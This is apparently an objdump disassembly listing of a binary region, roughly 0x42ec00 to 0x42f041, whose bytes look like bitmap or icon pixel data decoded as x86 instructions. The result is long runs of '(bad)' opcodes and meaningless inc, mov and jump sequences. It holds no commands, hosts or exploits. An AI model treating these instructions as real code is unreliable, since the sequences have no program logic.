  42ec00:	77 77                	ja     0x42ec79
  42ec02:	77 77                	ja     0x42ec7b
  42ec04:	77 77                	ja     0x42ec7d
  42ec06:	77 77                	ja     0x42ec7f
  42ec08:	77 77                	ja     0x42ec81
  42ec0a:	77 77                	ja     0x42ec83
  42ec0c:	77 77                	ja     0x42ec85
  42ec0e:	77 74                	ja     0x42ec84
  42ec10:	77 47                	ja     0x42ec59
  42ec12:	74 77                	je     0x42ec8b
  42ec14:	07                   	pop    %es
  42ec15:	43                   	inc    %ebx
  42ec16:	46                   	inc    %esi
  42ec17:	16                   	push   %ss
  42ec18:	56                   	push   %esi
  42ec19:	04 64                	add    $0x64,%al
  42ec1b:	06                   	push   %es
  42ec1c:	44                   	inc    %esp
  42ec1d:	64 44                	fs inc %esp
  42ec1f:	44                   	inc    %esp
  42ec20:	44                   	inc    %esp
  42ec21:	44                   	inc    %esp
  42ec22:	44                   	inc    %esp
  42ec23:	44                   	inc    %esp
  42ec24:	44                   	inc    %esp
  42ec25:	46                   	inc    %esi
  42ec26:	44                   	inc    %esp
  42ec27:	64 64 46             	fs fs inc %esi
  42ec2a:	44                   	inc    %esp
  42ec2b:	64 56                	fs push %esi
  42ec2d:	45                   	inc    %ebp
  42ec2e:	64 56                	fs push %esi
  42ec30:	54                   	push   %esp
  42ec31:	46                   	inc    %esi
  42ec32:	c4 6c 64 4c          	les    0x4c(%esp,%eiz,2),%ebp
  42ec36:	44                   	inc    %esp
  42ec37:	4c                   	dec    %esp
  42ec38:	44                   	inc    %esp
  42ec39:	c6                   	(bad)
  42ec3a:	4c                   	dec    %esp
  42ec3b:	5c                   	pop    %esp
  42ec3c:	64 7c 67             	fs jl  0x42eca6
  42ec3f:	67 7c 8c             	addr16 jl 0x42ebce
  42ec42:	87 88 88 88 88 88    	xchg   %ecx,-0x77777778(%eax)
  42ec48:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ec4e:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ec54:	88 88 88 88 f8 88    	mov    %cl,-0x77077778(%eax)
  42ec5a:	70 00                	jo     0x42ec5c
	...
  42ec64:	00 00                	add    %al,(%eax)
  42ec66:	77 77                	ja     0x42ecdf
  42ec68:	77 77                	ja     0x42ece1
  42ec6a:	77 77                	ja     0x42ece3
  42ec6c:	77 77                	ja     0x42ece5
  42ec6e:	77 77                	ja     0x42ece7
  42ec70:	77 77                	ja     0x42ece9
  42ec72:	77 77                	ja     0x42eceb
  42ec74:	77 77                	ja     0x42eced
  42ec76:	77 47                	ja     0x42ecbf
  42ec78:	74 77                	je     0x42ecf1
  42ec7a:	47                   	inc    %edi
  42ec7b:	70 74                	jo     0x42ecf1
  42ec7d:	34 61                	xor    $0x61,%al
  42ec7f:	65 24 06             	gs and $0x6,%al
  42ec82:	04 24                	add    $0x24,%al
  42ec84:	04 24                	add    $0x24,%al
  42ec86:	04 04                	add    $0x4,%al
  42ec88:	04 00                	add    $0x0,%al
  42ec8a:	40                   	inc    %eax
  42ec8b:	04 04                	add    $0x4,%al
  42ec8d:	04 04                	add    $0x4,%al
  42ec8f:	04 04                	add    $0x4,%al
  42ec91:	04 04                	add    $0x4,%al
  42ec93:	04 44                	add    $0x44,%al
  42ec95:	44                   	inc    %esp
  42ec96:	44                   	inc    %esp
  42ec97:	44                   	inc    %esp
  42ec98:	44                   	inc    %esp
  42ec99:	64 44                	fs inc %esp
  42ec9b:	44                   	inc    %esp
  42ec9c:	40                   	inc    %eax
  42ec9d:	44                   	inc    %esp
  42ec9e:	24 64                	and    $0x64,%al
  42eca0:	24 64                	and    $0x64,%al
  42eca2:	64 46                	fs inc %esi
  42eca4:	44                   	inc    %esp
  42eca5:	44                   	inc    %esp
  42eca6:	44                   	inc    %esp
  42eca7:	44                   	inc    %esp
  42eca8:	44                   	inc    %esp
  42eca9:	44                   	inc    %esp
  42ecaa:	44                   	inc    %esp
  42ecab:	44                   	inc    %esp
  42ecac:	44                   	inc    %esp
  42ecad:	64 44                	fs inc %esp
  42ecaf:	44                   	inc    %esp
  42ecb0:	46                   	inc    %esi
  42ecb1:	44                   	inc    %esp
  42ecb2:	44                   	inc    %esp
  42ecb3:	44                   	inc    %esp
  42ecb4:	44                   	inc    %esp
  42ecb5:	64 64 46             	fs fs inc %esi
  42ecb8:	44                   	inc    %esp
  42ecb9:	64 46                	fs inc %esi
  42ecbb:	44                   	inc    %esp
  42ecbc:	44                   	inc    %esp
  42ecbd:	46                   	inc    %esi
  42ecbe:	44                   	inc    %esp
  42ecbf:	c4 76 77             	les    0x77(%esi),%esi
  42ecc2:	77 c8                	ja     0x42ec8c
  42ecc4:	88 88 88 88 88 f8    	mov    %cl,-0x7777778(%eax)
  42ecca:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ecd0:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ecd6:	88 88 88 88 70 00    	mov    %cl,0x708888(%eax)
	...
  42ece4:	00 74 40 40          	add    %dh,0x40(%eax,%eax,2)
  42ece8:	40                   	inc    %eax
  42ece9:	04 00                	add    $0x0,%al
  42eceb:	40                   	inc    %eax
  42ecec:	04 00                	add    $0x0,%al
  42ecee:	40                   	inc    %eax
  42ecef:	04 00                	add    $0x0,%al
  42ecf1:	40                   	inc    %eax
	...
  42ecfa:	00 04 04             	add    %al,(%esp,%eax,1)
  42ecfd:	04 04                	add    $0x4,%al
  42ecff:	04 04                	add    $0x4,%al
  42ed01:	40                   	inc    %eax
  42ed02:	44                   	inc    %esp
  42ed03:	04 64                	add    $0x64,%al
  42ed05:	40                   	inc    %eax
  42ed06:	46                   	inc    %esi
  42ed07:	40                   	inc    %eax
  42ed08:	64 46                	fs inc %esi
  42ed0a:	44                   	inc    %esp
  42ed0b:	44                   	inc    %esp
  42ed0c:	04 40                	add    $0x40,%al
  42ed0e:	44                   	inc    %esp
  42ed0f:	42                   	inc    %edx
  42ed10:	44                   	inc    %esp
  42ed11:	60                   	pusha
  42ed12:	46                   	inc    %esi
  42ed13:	46                   	inc    %esi
  42ed14:	06                   	push   %es
  42ed15:	42                   	inc    %edx
  42ed16:	42                   	inc    %edx
  42ed17:	42                   	inc    %edx
  42ed18:	40                   	inc    %eax
  42ed19:	40                   	inc    %eax
  42ed1a:	42                   	inc    %edx
  42ed1b:	42                   	inc    %edx
  42ed1c:	46                   	inc    %esi
  42ed1d:	40                   	inc    %eax
  42ed1e:	44                   	inc    %esp
  42ed1f:	04 44                	add    $0x44,%al
  42ed21:	04 04                	add    $0x4,%al
  42ed23:	04 06                	add    $0x6,%al
  42ed25:	04 24                	add    $0x24,%al
  42ed27:	06                   	push   %es
  42ed28:	04 24                	add    $0x24,%al
  42ed2a:	24 06                	and    $0x6,%al
  42ed2c:	04 04                	add    $0x4,%al
  42ed2e:	06                   	push   %es
  42ed2f:	44                   	inc    %esp
  42ed30:	04 44                	add    $0x44,%al
  42ed32:	24 04                	and    $0x4,%al
  42ed34:	24 40                	and    $0x40,%al
  42ed36:	44                   	inc    %esp
  42ed37:	04 04                	add    $0x4,%al
  42ed39:	04 40                	add    $0x40,%al
  42ed3b:	42                   	inc    %edx
  42ed3c:	44                   	inc    %esp
  42ed3d:	44                   	inc    %esp
  42ed3e:	44                   	inc    %esp
  42ed3f:	44                   	inc    %esp
  42ed40:	4c                   	dec    %esp
  42ed41:	4c                   	dec    %esp
  42ed42:	7e 87                	jle    0x42eccb
  42ed44:	87 88 88 f8 88 88    	xchg   %ecx,-0x77770778(%eax)
  42ed4a:	88 88 88 f8 88 88    	mov    %cl,-0x77770778(%eax)
  42ed50:	8f 88 88 88          	(bad)
  42ed54:	88 88 88 f8 88 88    	mov    %cl,-0x77770778(%eax)
  42ed5a:	70 00                	jo     0x42ed5c
  42ed5c:	00 00                	add    %al,(%eax)
  42ed5e:	00 00                	add    %al,(%eax)
  42ed60:	00 00                	add    %al,(%eax)
  42ed62:	00 07                	add    %al,(%edi)
  42ed64:	76 42                	jbe    0x42eda8
  42ed66:	ff                   	(bad)
  42ed67:	ff                   	(bad)
  42ed68:	ff                   	(bad)
  42ed69:	ff                   	(bad)
  42ed6a:	ff                   	(bad)
  42ed6b:	ff                   	(bad)
  42ed6c:	ff                   	(bad)
  42ed6d:	ff                   	(bad)
  42ed6e:	ff                   	(bad)
  42ed6f:	ff                   	(bad)
  42ed70:	ff                   	(bad)
  42ed71:	ff                   	(bad)
  42ed72:	ff                   	(bad)
  42ed73:	ff                   	(bad)
  42ed74:	ff                   	(bad)
  42ed75:	ff                   	(bad)
  42ed76:	ff                   	(bad)
  42ed77:	ff                   	(bad)
  42ed78:	ff                   	(bad)
  42ed79:	ff                   	(bad)
  42ed7a:	ff                   	(bad)
  42ed7b:	ff                   	(bad)
  42ed7c:	ff                   	(bad)
  42ed7d:	ff                   	(bad)
  42ed7e:	ff                   	(bad)
  42ed7f:	ff                   	(bad)
  42ed80:	ff                   	(bad)
  42ed81:	ff                   	(bad)
  42ed82:	ff                   	(bad)
  42ed83:	ff                   	(bad)
  42ed84:	ff                   	(bad)
  42ed85:	ff                   	(bad)
  42ed86:	ff                   	(bad)
  42ed87:	ff                   	(bad)
  42ed88:	ff                   	(bad)
  42ed89:	ff                   	(bad)
  42ed8a:	ff                   	(bad)
  42ed8b:	ff                   	(bad)
  42ed8c:	ff                   	(bad)
  42ed8d:	ff                   	(bad)
  42ed8e:	ff                   	(bad)
  42ed8f:	ff                   	(bad)
  42ed90:	ff                   	(bad)
  42ed91:	ff                   	(bad)
  42ed92:	ff                   	(bad)
  42ed93:	ff                   	(bad)
  42ed94:	ff                   	(bad)
  42ed95:	ff                   	(bad)
  42ed96:	ff                   	(bad)
  42ed97:	ff                   	(bad)
  42ed98:	ff                   	(bad)
  42ed99:	ff                   	(bad)
  42ed9a:	ff                   	(bad)
  42ed9b:	ff                   	(bad)
  42ed9c:	ff                   	(bad)
  42ed9d:	ff                   	(bad)
  42ed9e:	ff                   	(bad)
  42ed9f:	ff                   	(bad)
  42eda0:	ff                   	(bad)
  42eda1:	ff                   	(bad)
  42eda2:	ff                   	(bad)
  42eda3:	ff                   	(bad)
  42eda4:	ff                   	(bad)
  42eda5:	ff                   	(bad)
  42eda6:	ff                   	(bad)
  42eda7:	ff                   	(bad)
  42eda8:	ff                   	(bad)
  42eda9:	ff                   	(bad)
  42edaa:	ff                   	(bad)
  42edab:	ff                   	(bad)
  42edac:	ff                   	(bad)
  42edad:	ff                   	(bad)
  42edae:	ff                   	(bad)
  42edaf:	ff                   	(bad)
  42edb0:	ff                   	(bad)
  42edb1:	ff                   	(bad)
  42edb2:	ff                   	(bad)
  42edb3:	ff                   	(bad)
  42edb4:	ff                   	(bad)
  42edb5:	ff                   	(bad)
  42edb6:	ff                   	(bad)
  42edb7:	ff                   	(bad)
  42edb8:	ff                   	(bad)
  42edb9:	ff                   	(bad)
  42edba:	ff                   	(bad)
  42edbb:	ff                   	(bad)
  42edbc:	ff                   	(bad)
  42edbd:	ff 8f 87 76 46 c5    	decl   -0x3ab98979(%edi)
  42edc3:	7c 8e                	jl     0x42ed53
  42edc5:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42edcb:	f8                   	clc
  42edcc:	88 88 88 f8 88 88    	mov    %cl,-0x77770778(%eax)
  42edd2:	f8                   	clc
  42edd3:	8f 88 f8 88          	(bad)
  42edd7:	88 88 f8 70 00 00    	mov    %cl,0x70f8(%eax)
  42eddd:	00 00                	add    %al,(%eax)
  42eddf:	00 00                	add    %al,(%eax)
  42ede1:	00 07                	add    %al,(%edi)
  42ede3:	c6 44 44 ff ff       	movb   $0xff,-0x1(%esp,%eax,2)
  42ede8:	ff                   	(bad)
  42ede9:	ff                   	(bad)
  42edea:	ff                   	(bad)
  42edeb:	ff                   	(bad)
  42edec:	ff                   	(bad)
  42eded:	ff                   	(bad)
  42edee:	ff                   	(bad)
  42edef:	ff                   	(bad)
  42edf0:	ff                   	(bad)
  42edf1:	ff                   	(bad)
  42edf2:	ff                   	(bad)
  42edf3:	ff                   	(bad)
  42edf4:	ff                   	(bad)
  42edf5:	ff                   	(bad)
  42edf6:	ff                   	(bad)
  42edf7:	ff                   	(bad)
  42edf8:	ff                   	(bad)
  42edf9:	ff                   	(bad)
  42edfa:	ff                   	(bad)
  42edfb:	ff                   	(bad)
  42edfc:	ff                   	(bad)
  42edfd:	ff                   	(bad)
  42edfe:	ff                   	(bad)
  42edff:	ff                   	(bad)
  42ee00:	ff                   	(bad)
  42ee01:	ff                   	(bad)
  42ee02:	ff                   	(bad)
  42ee03:	ff                   	(bad)
  42ee04:	ff                   	(bad)
  42ee05:	ff                   	(bad)
  42ee06:	ff                   	(bad)
  42ee07:	ff                   	(bad)
  42ee08:	ff                   	(bad)
  42ee09:	ff                   	(bad)
  42ee0a:	ff                   	(bad)
  42ee0b:	ff                   	(bad)
  42ee0c:	ff                   	(bad)
  42ee0d:	ff                   	(bad)
  42ee0e:	ff                   	(bad)
  42ee0f:	ff                   	(bad)
  42ee10:	ff                   	(bad)
  42ee11:	ff                   	(bad)
  42ee12:	ff                   	(bad)
  42ee13:	ff                   	(bad)
  42ee14:	ff                   	(bad)
  42ee15:	ff                   	(bad)
  42ee16:	ff                   	(bad)
  42ee17:	ff                   	(bad)
  42ee18:	ff                   	(bad)
  42ee19:	ff                   	(bad)
  42ee1a:	ff                   	(bad)
  42ee1b:	ff                   	(bad)
  42ee1c:	ff                   	(bad)
  42ee1d:	ff                   	(bad)
  42ee1e:	ff                   	(bad)
  42ee1f:	ff                   	(bad)
  42ee20:	ff                   	(bad)
  42ee21:	ff                   	(bad)
  42ee22:	ff                   	(bad)
  42ee23:	ff                   	(bad)
  42ee24:	ff                   	(bad)
  42ee25:	ff                   	(bad)
  42ee26:	ff                   	(bad)
  42ee27:	ff                   	(bad)
  42ee28:	ff                   	(bad)
  42ee29:	ff                   	(bad)
  42ee2a:	ff                   	(bad)
  42ee2b:	ff                   	(bad)
  42ee2c:	ff                   	(bad)
  42ee2d:	ff                   	(bad)
  42ee2e:	ff                   	(bad)
  42ee2f:	ff                   	(bad)
  42ee30:	ff                   	(bad)
  42ee31:	ff                   	(bad)
  42ee32:	ff                   	(bad)
  42ee33:	ff                   	(bad)
  42ee34:	ff                   	(bad)
  42ee35:	ff                   	(bad)
  42ee36:	ff                   	(bad)
  42ee37:	ff                   	(bad)
  42ee38:	ff                   	(bad)
  42ee39:	ff                   	(bad)
  42ee3a:	ff                   	(bad)
  42ee3b:	ff                   	(bad)
  42ee3c:	ff                   	(bad)
  42ee3d:	ff                   	(bad)
  42ee3e:	ff                   	(bad)
  42ee3f:	ff                   	(bad)
  42ee40:	f8                   	clc
  42ee41:	87 46 c7             	xchg   %eax,-0x39(%esi)
  42ee44:	7c 88                	jl     0x42edce
  42ee46:	88 88 8f 88 88 88    	mov    %cl,-0x77777771(%eax)
  42ee4c:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ee52:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ee58:	88 88 70 00 00 00    	mov    %cl,0x70(%eax)
  42ee5e:	00 00                	add    %al,(%eax)
  42ee60:	00 00                	add    %al,(%eax)
  42ee62:	06                   	push   %es
  42ee63:	6c                   	insb   (%dx),%es:(%edi)
  42ee64:	6c                   	insb   (%dx),%es:(%edi)
  42ee65:	64 ff                	fs (bad)
  42ee67:	ff                   	(bad)
  42ee68:	ff                   	(bad)
  42ee69:	ff                   	(bad)
  42ee6a:	ff                   	(bad)
  42ee6b:	ff                   	(bad)
  42ee6c:	ff                   	(bad)
  42ee6d:	ff                   	(bad)
  42ee6e:	ff                   	(bad)
  42ee6f:	ff                   	(bad)
  42ee70:	ff                   	(bad)
  42ee71:	ff                   	(bad)
  42ee72:	ff                   	(bad)
  42ee73:	ff                   	(bad)
  42ee74:	ff                   	(bad)
  42ee75:	ff                   	(bad)
  42ee76:	ff                   	(bad)
  42ee77:	ff                   	(bad)
  42ee78:	ff                   	(bad)
  42ee79:	ff                   	(bad)
  42ee7a:	ff                   	(bad)
  42ee7b:	ff                   	(bad)
  42ee7c:	ff                   	(bad)
  42ee7d:	ff                   	(bad)
  42ee7e:	ff                   	(bad)
  42ee7f:	ff                   	(bad)
  42ee80:	ff                   	(bad)
  42ee81:	ff                   	(bad)
  42ee82:	ff                   	(bad)
  42ee83:	ff                   	(bad)
  42ee84:	ff                   	(bad)
  42ee85:	ff                   	(bad)
  42ee86:	ff                   	(bad)
  42ee87:	ff                   	(bad)
  42ee88:	ff                   	(bad)
  42ee89:	ff                   	(bad)
  42ee8a:	ff                   	(bad)
  42ee8b:	ff                   	(bad)
  42ee8c:	ff                   	(bad)
  42ee8d:	ff                   	(bad)
  42ee8e:	ff                   	(bad)
  42ee8f:	ff                   	(bad)
  42ee90:	ff                   	(bad)
  42ee91:	ff                   	(bad)
  42ee92:	ff                   	(bad)
  42ee93:	ff                   	(bad)
  42ee94:	ff                   	(bad)
  42ee95:	ff                   	(bad)
  42ee96:	ff                   	(bad)
  42ee97:	ff                   	(bad)
  42ee98:	ff                   	(bad)
  42ee99:	ff                   	(bad)
  42ee9a:	ff                   	(bad)
  42ee9b:	ff                   	(bad)
  42ee9c:	ff                   	(bad)
  42ee9d:	ff                   	(bad)
  42ee9e:	ff                   	(bad)
  42ee9f:	ff                   	(bad)
  42eea0:	ff                   	(bad)
  42eea1:	ff                   	(bad)
  42eea2:	ff                   	(bad)
  42eea3:	ff                   	(bad)
  42eea4:	ff                   	(bad)
  42eea5:	ff                   	(bad)
  42eea6:	ff                   	(bad)
  42eea7:	ff                   	(bad)
  42eea8:	ff                   	(bad)
  42eea9:	ff                   	(bad)
  42eeaa:	ff                   	(bad)
  42eeab:	ff                   	(bad)
  42eeac:	ff                   	(bad)
  42eead:	ff                   	(bad)
  42eeae:	ff                   	(bad)
  42eeaf:	ff                   	(bad)
  42eeb0:	ff                   	(bad)
  42eeb1:	ff                   	(bad)
  42eeb2:	ff                   	(bad)
  42eeb3:	ff                   	(bad)
  42eeb4:	ff                   	(bad)
  42eeb5:	ff                   	(bad)
  42eeb6:	ff                   	(bad)
  42eeb7:	ff                   	(bad)
  42eeb8:	ff                   	(bad)
  42eeb9:	ff                   	(bad)
  42eeba:	ff                   	(bad)
  42eebb:	ff                   	(bad)
  42eebc:	ff                   	(bad)
  42eebd:	ff                   	(bad)
  42eebe:	ff                   	(bad)
  42eebf:	ff                   	(bad)
  42eec0:	ff                   	(bad)
  42eec1:	f8                   	clc
  42eec2:	88 46 c7             	mov    %al,-0x39(%esi)
  42eec5:	7c 88                	jl     0x42ee4f
  42eec7:	88 88 88 f8 88 88    	mov    %cl,-0x77770778(%eax)
  42eecd:	8f 88 88 88          	(bad)
  42eed1:	f8                   	clc
  42eed2:	88 88 88 88 f8 88    	mov    %cl,-0x77077778(%eax)
  42eed8:	f8                   	clc
  42eed9:	88 70 00             	mov    %dh,0x0(%eax)
  42eedc:	00 00                	add    %al,(%eax)
  42eede:	00 00                	add    %al,(%eax)
  42eee0:	00 00                	add    %al,(%eax)
  42eee2:	07                   	pop    %es
  42eee3:	c6 c6 44             	mov    $0x44,%dh
  42eee6:	ff                   	(bad)
  42eee7:	ff                   	(bad)
  42eee8:	ff                   	(bad)
  42eee9:	ff                   	(bad)
  42eeea:	ff                   	(bad)
  42eeeb:	ff                   	(bad)
  42eeec:	ff                   	(bad)
  42eeed:	ff                   	(bad)
  42eeee:	ff                   	(bad)
  42eeef:	ff                   	(bad)
  42eef0:	ff                   	(bad)
  42eef1:	ff                   	(bad)
  42eef2:	ff                   	(bad)
  42eef3:	ff                   	(bad)
  42eef4:	ff                   	(bad)
  42eef5:	ff                   	(bad)
  42eef6:	ff                   	(bad)
  42eef7:	ff                   	(bad)
  42eef8:	ff                   	(bad)
  42eef9:	ff                   	(bad)
  42eefa:	ff                   	(bad)
  42eefb:	ff                   	(bad)
  42eefc:	ff                   	(bad)
  42eefd:	ff                   	(bad)
  42eefe:	ff                   	(bad)
  42eeff:	ff                   	(bad)
  42ef00:	ff                   	(bad)
  42ef01:	ff                   	(bad)
  42ef02:	ff                   	(bad)
  42ef03:	ff                   	(bad)
  42ef04:	ff                   	(bad)
  42ef05:	ff                   	(bad)
  42ef06:	ff                   	(bad)
  42ef07:	ff                   	(bad)
  42ef08:	ff                   	(bad)
  42ef09:	ff                   	(bad)
  42ef0a:	ff                   	(bad)
  42ef0b:	ff                   	(bad)
  42ef0c:	ff                   	(bad)
  42ef0d:	ff                   	(bad)
  42ef0e:	ff                   	(bad)
  42ef0f:	ff                   	(bad)
  42ef10:	ff                   	(bad)
  42ef11:	ff                   	(bad)
  42ef12:	ff                   	(bad)
  42ef13:	ff                   	(bad)
  42ef14:	ff                   	(bad)
  42ef15:	ff                   	(bad)
  42ef16:	ff                   	(bad)
  42ef17:	ff                   	(bad)
  42ef18:	ff                   	(bad)
  42ef19:	ff                   	(bad)
  42ef1a:	ff                   	(bad)
  42ef1b:	ff                   	(bad)
  42ef1c:	ff                   	(bad)
  42ef1d:	ff                   	(bad)
  42ef1e:	ff                   	(bad)
  42ef1f:	ff                   	(bad)
  42ef20:	ff                   	(bad)
  42ef21:	ff                   	(bad)
  42ef22:	ff                   	(bad)
  42ef23:	ff                   	(bad)
  42ef24:	ff                   	(bad)
  42ef25:	ff                   	(bad)
  42ef26:	ff                   	(bad)
  42ef27:	ff                   	(bad)
  42ef28:	ff                   	(bad)
  42ef29:	ff                   	(bad)
  42ef2a:	ff                   	(bad)
  42ef2b:	ff                   	(bad)
  42ef2c:	ff                   	(bad)
  42ef2d:	ff                   	(bad)
  42ef2e:	ff                   	(bad)
  42ef2f:	ff                   	(bad)
  42ef30:	ff                   	(bad)
  42ef31:	ff                   	(bad)
  42ef32:	ff                   	(bad)
  42ef33:	ff                   	(bad)
  42ef34:	ff                   	(bad)
  42ef35:	ff                   	(bad)
  42ef36:	ff                   	(bad)
  42ef37:	ff                   	(bad)
  42ef38:	ff                   	(bad)
  42ef39:	ff                   	(bad)
  42ef3a:	ff                   	(bad)
  42ef3b:	ff                   	(bad)
  42ef3c:	ff                   	(bad)
  42ef3d:	ff                   	(bad)
  42ef3e:	ff                   	(bad)
  42ef3f:	ff                   	(bad)
  42ef40:	ff                   	(bad)
  42ef41:	ff f7                	push   %edi
  42ef43:	87 46 c7             	xchg   %eax,-0x39(%esi)
  42ef46:	7e 88                	jle    0x42eed0
  42ef48:	88 88 88 88 f8 88    	mov    %cl,-0x77077778(%eax)
  42ef4e:	88 8f 88 88 88 88    	mov    %cl,-0x77777778(%edi)
  42ef54:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ef5a:	80 00 00             	addb   $0x0,(%eax)
  42ef5d:	00 00                	add    %al,(%eax)
  42ef5f:	00 00                	add    %al,(%eax)
  42ef61:	00 08                	add    %cl,(%eax)
  42ef63:	c6 c6 46             	mov    $0x46,%dh
  42ef66:	ff                   	(bad)
  42ef67:	ff                   	(bad)
  42ef68:	ff                   	(bad)
  42ef69:	ff                   	(bad)
  42ef6a:	ff                   	(bad)
  42ef6b:	ff                   	(bad)
  42ef6c:	ff                   	(bad)
  42ef6d:	ff                   	(bad)
  42ef6e:	ff                   	(bad)
  42ef6f:	ff                   	(bad)
  42ef70:	ff                   	(bad)
  42ef71:	ff                   	(bad)
  42ef72:	ff                   	(bad)
  42ef73:	ff                   	(bad)
  42ef74:	ff                   	(bad)
  42ef75:	ff                   	(bad)
  42ef76:	ff                   	(bad)
  42ef77:	ff                   	(bad)
  42ef78:	ff                   	(bad)
  42ef79:	ff                   	(bad)
  42ef7a:	ff                   	(bad)
  42ef7b:	ff                   	(bad)
  42ef7c:	ff                   	(bad)
  42ef7d:	ff                   	(bad)
  42ef7e:	ff                   	(bad)
  42ef7f:	ff                   	(bad)
  42ef80:	ff                   	(bad)
  42ef81:	ff                   	(bad)
  42ef82:	ff                   	(bad)
  42ef83:	ff                   	(bad)
  42ef84:	ff                   	(bad)
  42ef85:	ff                   	(bad)
  42ef86:	ff                   	(bad)
  42ef87:	ff                   	(bad)
  42ef88:	ff                   	(bad)
  42ef89:	ff                   	(bad)
  42ef8a:	ff                   	(bad)
  42ef8b:	ff                   	(bad)
  42ef8c:	ff                   	(bad)
  42ef8d:	ff                   	(bad)
  42ef8e:	ff                   	(bad)
  42ef8f:	ff                   	(bad)
  42ef90:	ff                   	(bad)
  42ef91:	ff                   	(bad)
  42ef92:	ff                   	(bad)
  42ef93:	ff                   	(bad)
  42ef94:	ff                   	(bad)
  42ef95:	ff                   	(bad)
  42ef96:	ff                   	(bad)
  42ef97:	ff                   	(bad)
  42ef98:	ff                   	(bad)
  42ef99:	ff                   	(bad)
  42ef9a:	ff                   	(bad)
  42ef9b:	ff                   	(bad)
  42ef9c:	ff                   	(bad)
  42ef9d:	ff                   	(bad)
  42ef9e:	ff                   	(bad)
  42ef9f:	ff                   	(bad)
  42efa0:	ff                   	(bad)
  42efa1:	ff                   	(bad)
  42efa2:	ff                   	(bad)
  42efa3:	ff                   	(bad)
  42efa4:	ff                   	(bad)
  42efa5:	ff                   	(bad)
  42efa6:	ff                   	(bad)
  42efa7:	ff                   	(bad)
  42efa8:	ff                   	(bad)
  42efa9:	ff                   	(bad)
  42efaa:	ff                   	(bad)
  42efab:	ff                   	(bad)
  42efac:	ff                   	(bad)
  42efad:	ff                   	(bad)
  42efae:	ff                   	(bad)
  42efaf:	ff                   	(bad)
  42efb0:	ff                   	(bad)
  42efb1:	ff                   	(bad)
  42efb2:	ff                   	(bad)
  42efb3:	ff                   	(bad)
  42efb4:	ff                   	(bad)
  42efb5:	ff                   	(bad)
  42efb6:	ff                   	(bad)
  42efb7:	ff                   	(bad)
  42efb8:	ff                   	(bad)
  42efb9:	ff                   	(bad)
  42efba:	ff                   	(bad)
  42efbb:	ff                   	(bad)
  42efbc:	ff                   	(bad)
  42efbd:	ff                   	(bad)
  42efbe:	ff                   	(bad)
  42efbf:	ff                   	(bad)
  42efc0:	ff                   	(bad)
  42efc1:	ff                   	(bad)
  42efc2:	ff                   	(bad)
  42efc3:	78 88                	js     0x42ef4d
  42efc5:	46                   	inc    %esi
  42efc6:	c7 78 e8 88 88       	xbegin 0x88cbd843,(bad)
  42efcb:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42efd1:	88 88 88 f8 88 88    	mov    %cl,-0x77770778(%eax)
  42efd7:	88 88 f8 70 00 00    	mov    %cl,0x70f8(%eax)
  42efdd:	00 00                	add    %al,(%eax)
  42efdf:	00 00                	add    %al,(%eax)
  42efe1:	00 00                	add    %al,(%eax)
  42efe3:	6c                   	insb   (%dx),%es:(%edi)
  42efe4:	64 64 ff             	fs fs (bad)
  42efe7:	ff                   	(bad)
  42efe8:	ff                   	(bad)
  42efe9:	ff                   	(bad)
  42efea:	ff                   	(bad)
  42efeb:	ff                   	(bad)
  42efec:	ff                   	(bad)
  42efed:	ff                   	(bad)
  42efee:	ff                   	(bad)
  42efef:	ff                   	(bad)
  42eff0:	ff                   	(bad)
  42eff1:	ff                   	(bad)
  42eff2:	ff                   	(bad)
  42eff3:	ff                   	(bad)
  42eff4:	ff                   	(bad)
  42eff5:	ff                   	(bad)
  42eff6:	ff                   	(bad)
  42eff7:	ff                   	(bad)
  42eff8:	ff                   	(bad)
  42eff9:	ff                   	(bad)
  42effa:	ff                   	(bad)
  42effb:	ff                   	(bad)
  42effc:	ff                   	(bad)
  42effd:	ff                   	(bad)
  42effe:	ff                   	(bad)
  42efff:	ff                   	(bad)
  42f000:	ff                   	(bad)
  42f001:	ff                   	(bad)
  42f002:	ff                   	(bad)
  42f003:	ff                   	(bad)
  42f004:	ff                   	(bad)
  42f005:	ff                   	(bad)
  42f006:	ff                   	(bad)
  42f007:	ff                   	(bad)
  42f008:	ff                   	(bad)
  42f009:	ff                   	(bad)
  42f00a:	ff                   	(bad)
  42f00b:	ff                   	(bad)
  42f00c:	ff                   	(bad)
  42f00d:	ff                   	(bad)
  42f00e:	ff                   	(bad)
  42f00f:	ff                   	(bad)
  42f010:	ff                   	(bad)
  42f011:	ff                   	(bad)
  42f012:	ff                   	(bad)
  42f013:	ff                   	(bad)
  42f014:	ff                   	(bad)
  42f015:	ff                   	(bad)
  42f016:	ff                   	(bad)
  42f017:	ff                   	(bad)
  42f018:	ff                   	(bad)
  42f019:	ff                   	(bad)
  42f01a:	ff                   	(bad)
  42f01b:	ff                   	(bad)
  42f01c:	ff                   	(bad)
  42f01d:	ff                   	(bad)
  42f01e:	ff                   	(bad)
  42f01f:	ff                   	(bad)
  42f020:	ff                   	(bad)
  42f021:	ff                   	(bad)
  42f022:	ff                   	(bad)
  42f023:	ff                   	(bad)
  42f024:	ff                   	(bad)
  42f025:	ff                   	(bad)
  42f026:	ff                   	(bad)
  42f027:	ff                   	(bad)
  42f028:	ff                   	(bad)
  42f029:	ff                   	(bad)
  42f02a:	ff                   	(bad)
  42f02b:	ff                   	(bad)
  42f02c:	ff                   	(bad)
  42f02d:	ff                   	(bad)
  42f02e:	ff                   	(bad)
  42f02f:	ff                   	(bad)
  42f030:	ff                   	(bad)
  42f031:	ff                   	(bad)
  42f032:	ff                   	(bad)
  42f033:	ff                   	(bad)
  42f034:	ff                   	(bad)
  42f035:	ff                   	(bad)
  42f036:	ff                   	(bad)
  42f037:	ff                   	(bad)
  42f038:	ff                   	(bad)
  42f039:	ff                   	(bad)
  42f03a:	ff                   	(bad)
  42f03b:	ff                   	(bad)
  42f03c:	ff                   	(bad)
  42f03d:	ff                   	(bad)
  42f03e:	ff                   	(bad)
  42f03f:	ff                   	(bad)
  42f040:	ff                   	(bad)
  42f041:	ff                   	(bad)
